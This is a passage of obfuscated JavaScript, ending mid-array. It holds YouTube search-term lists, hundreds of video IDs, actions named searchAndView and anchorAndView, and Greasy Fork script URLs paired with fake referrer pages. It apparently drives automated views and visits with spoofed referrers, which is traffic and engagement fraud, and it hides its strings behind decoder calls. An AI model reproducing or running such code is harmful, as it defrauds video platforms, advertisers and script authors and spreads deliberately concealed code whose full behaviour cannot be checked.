searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + Y(0xc, 'E&[Q') + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + Y(0x1, 'fU*v') + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + Z(0xf) + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x4b4 + 0x1f08 + -0x23b2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * 0x1397 + 0xd * -0x18d + 0x27ca)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1dbb + 0x18e7 + 0x4d7);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    Y(0x0, 'AujR') + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    a0(0xb) + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    Y(0x1c, 'QA3f') + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + Z(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + a0(0x3) + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + Y(0x10, 'AujR') + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x2, 'waG3')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': Z(0x4) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
